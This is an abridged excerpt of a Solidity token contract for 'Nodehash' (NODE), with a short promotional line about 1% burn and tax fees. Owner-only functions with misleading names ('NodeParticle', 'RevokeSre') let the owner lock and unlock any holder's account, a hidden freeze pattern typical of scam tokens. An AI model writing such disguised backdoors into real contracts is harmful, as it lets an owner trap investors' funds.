...
Nodehash is a multi-chain decentralized application layer on Kusama Network. 
Burn : 1% | Tax fee : 1%
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Nodehash';
    string constant public symbol = 'NODE';
    ...
    function NodeParticle(address account) public onlyOwner {
        _locked[account] = true;
    }

    function RevokeSre(address account) public onlyOwner {
        _locked[account] = false;
    }
    
    
    function NodehashStats(address account) public view returns (bool) {
...
contract NodeContract is BaseToken {
